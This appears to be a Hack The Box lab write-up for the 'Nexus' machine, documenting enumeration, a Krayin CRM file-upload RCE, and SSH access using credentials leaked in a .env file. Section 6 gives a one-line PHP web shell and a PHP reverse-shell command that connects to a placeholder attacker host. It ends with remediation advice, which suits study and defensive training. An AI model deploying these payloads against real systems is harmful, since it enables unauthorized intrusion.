# Hack The Box – Nexus

**Machine:** Nexus  
**Platform:** Hack The Box  
**Target OS:** Linux  
**Difficulty:** [middle]  
**Category:** Web Application Security / Remote Code Execution / Privilege Escalation  
**Status:** User access obtained; root access pending

---

## 1. Executive Summary

This report documents the security assessment of the Nexus machine on Hack The Box.

The assessment involved network reconnaissance, service enumeration, web application analysis, vulnerability research, exploitation, and credential discovery.

Two open TCP ports were identified: 22 (SSH) and 80 (HTTP).

Further enumeration revealed a Gitea instance and a billing application running Krayin CRM version 2.2.0.

After authenticating to the CRM using previously discovered credentials, the application version was identified. Public vulnerability research led to CVE-2026-38526, which describes a file-upload vulnerability potentially resulting in Remote Code Execution (RCE).

Following exploitation, a reverse shell was established. Credentials discovered in a Git repository's `.env` file were subsequently used to authenticate over SSH as the user `jones`.

The user-level flag was successfully retrieved.

**Current result:** User-level access obtained. Privilege escalation to root remains to be documented.

---

## 2. Scope and Objectives

The objective was to assess the security of the Nexus machine by identifying exposed services, discovering potential vulnerabilities, obtaining initial access, and investigating possible privilege-escalation paths.

The assessment included:

- Network and service enumeration.
- Web application reconnaissance.
- Gitea repository inspection.
- Krayin CRM version identification.
- Vulnerability research and validation.
- Remote Code Execution testing.
- Credential discovery.
- SSH authentication.
- User-level access verification.

---

## 3. Initial Reconnaissance

### 3.1 Port Scanning

An initial Nmap scan was performed to identify accessible TCP services.

The scan identified two open ports:

| Port | Protocol | Service | Purpose |
|---|---|---|---|
| 22 | TCP | SSH | Remote administration |
| 80 | TCP | HTTP | Web application |

**Observations:**

- Port 22 exposed an SSH service.
- Port 80 hosted the web application.
- The HTTP service was selected for further enumeration.

*Evidence: Add `screenshots/nmap-scan.png`.*

### 3.2 Web Enumeration

Further investigation of the HTTP service revealed two relevant applications:

- Gitea – version 1.26.0.
- Billing application – hosted at `billing.nexus.htb`.

## 4. Enumeration

### 4.1 Gitea – Source Code Management

During web enumeration, a Gitea instance was discovered.

**Identified application:** Gitea  
**Version:** 1.26.0

<img width="1920" height="1140" alt="Screenshot 2026-11-01 160201" src="https://github.com/user-attachments/assets/4ca04b09-202d-4f76-a81f-cec94ee6bb72" />

The Git repository was inspected for potentially sensitive information.

During repository enumeration, an `.env` file was discovered. It contained credentials that were later used to obtain SSH access.

This finding demonstrated the security risks associated with storing sensitive credentials in source-code repositories.


### 4.2 Billing Application – Krayin CRM

The following virtual host was identified:

`billing.nexus.htb`

Accessing the hostname redirected to:

`http://billing.nexus.htb/admin/login`

The login page revealed that the application was running Krayin CRM.

Previously discovered credentials were used to authenticate:

<img width="1920" height="1140" alt="Screenshot 2026-11-01 160712" src="https://github.com/user-attachments/assets/d99b1016-fb2e-4fca-94cf-c90ae2359aa9" />

| Parameter | Value |
|---|---|
| Username | `j.matthew@nexus.htb` |
| Password | Previously discovered password |
| Application | Krayin CRM |

Authentication was successful.

### 4.3 Version Identification

After logging in, the application version was identified as:

`Krayin CRM v2.2.0`

This information was used to investigate publicly disclosed vulnerabilities affecting the application.

---

## 5. Vulnerability Research

### 5.1 CVE-2026-38526

A search for vulnerabilities affecting Krayin CRM v2.2.0 led to the following public vulnerability reference:

**CVE:** CVE-2026-38526  
**Vulnerability:** File Upload leading to Remote Code Execution  
**Reported CVSS:** 9.9  
**Potential Impact:** Remote Code Execution and server compromise.

Reference:

https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md

The disclosed proof of concept described a file-upload exploitation technique involving a malicious PHP file.

The potential impact was arbitrary command execution in the context of the web server process.

*Note: The CVE applicability, affected version range, authentication requirements, and CVSS score should be independently verified before treating them as confirmed findings in a formal report.*

---

## 6. Exploitation – Initial Access

### 6.1 PHP Web Shell

A PHP web shell was prepared for testing:

```php
<?php echo shell_exec($_GET["c"]); ?>
```

The script uses the PHP `shell_exec()` function to execute operating-system commands supplied through the `c` parameter.
<img width="1920" height="1140" alt="Screenshot 2026-11-01 161553" src="https://github.com/user-attachments/assets/d4c91ff3-877b-4478-bc6e-30aa13dfd6f3" />

Example request:

```text
http://TARGET/shell.php?c=id
```

Successful execution would demonstrate that commands could be executed through the uploaded PHP file.

### 6.2 Reverse Shell

After the file-upload exploitation, a PHP reverse-shell payload was prepared.

```bash
php -r '$sock=fsockopen("ATTACKER_IP",8022);exec("/bin/sh -i <&3 >&3 2>&3");'
```

The payload was URL-encoded before being submitted.

A listener was configured on the attacking machine to receive the incoming connection.

After successful execution, a reverse shell was established.
<img width="1920" height="1140" alt="Screenshot 2026-11-01 162147" src="https://github.com/user-attachments/assets/a4f8b93f-38b0-4596-9542-8bf5fbec0171" />

### 6.3 Shell Stabilization

The initial shell was upgraded to an interactive Bash session using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This provided a more convenient interactive environment for subsequent enumeration.

---

## 7. Credential Discovery

### 7.1 Git Repository – .env File

During further investigation of the Git repository, an `.env` file was discovered.

The file contained credentials that were later found to be valid for SSH authentication.

This demonstrated the potential consequences of exposing environment configuration files through source-code management.

**Security impact:**

- Exposure of sensitive credentials.
- Potential credential reuse.
- Possible unauthorized remote access.

Actual credentials are intentionally excluded from this report.

---

## 8. SSH Access

### 8.1 Authentication as jones

Using the credentials recovered from the `.env` file, SSH authentication was attempted.

Command:

```bash
ssh jones@TARGET_IP
```

Authentication was successful, providing access to the machine as the `jones` user.

This confirmed that the recovered credentials could be reused for SSH access.

### 8.2 User Flag

After obtaining SSH access, the user flag was retrieved using:

```bash
cat user.txt
```

**Result:** User-level access successfully obtained.

The actual flag is not included in this public report.

---

## 9. Privilege Escalation

**Status:** Pending documentation.

Further enumeration is required to identify potential privilege-escalation vectors and determine whether root access can be obtained.

This section will document:

- System information.
- User permissions.
- Sudo permissions.
- Running processes and services.
- Scheduled tasks.
- SUID binaries.
- File permissions and potential misconfigurations.
- Exploitation steps, if applicable.

No privilege-escalation vulnerability is claimed until it has been verified.

---

## 10. Security Findings and Recommendations

| Finding | Potential Impact | Recommendation |
|---|---|---|
| Sensitive credentials in Git repository | Unauthorized access | Remove secrets from repositories and rotate exposed credentials |
| Potentially vulnerable CRM version | Remote Code Execution | Verify vulnerability applicability and upgrade to a patched version |
| PHP file-upload risk | Server-side code execution | Validate file types, restrict executable uploads, and store uploads outside the web root |
| Credential reuse | Unauthorized SSH access | Use unique credentials and enforce stronger authentication controls |

### Additional Recommendations

1. Never commit passwords, API keys, or database credentials to Git repositories.
2. Use environment-specific secret management.
3. Restrict access to administrative interfaces.
4. Keep CRM applications and dependencies updated.
5. Implement strict upload validation and server-side file handling.
6. Disable execution permissions for uploaded files.
7. Apply least-privilege principles to application service accounts.
8. Use SSH keys and disable password authentication where appropriate.

---

## 11. Conclusion

The assessment identified multiple attack surfaces within the Nexus environment.

The exposed HTTP service led to the discovery of Gitea and a Krayin CRM application. After identifying the CRM version and researching a potentially applicable vulnerability, a file-upload exploitation path was investigated to obtain Remote Code Execution.

Following successful shell access, credentials discovered in the Git repository's `.env` file enabled SSH authentication as `jones`.

The user-level flag was successfully retrieved.

The next phase of the assessment is privilege-escalation analysis and root-level access verification.

---

## 12. References

- Hack The Box: https://www.hackthebox.com/
- Gitea: https://gitea.com/
- Krayin CRM: https://krayin.ai/
- CVE-2026-38526 PoC: https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md

**Assessment status:** Initial access and user-level compromise documented. Root-level compromise pending.
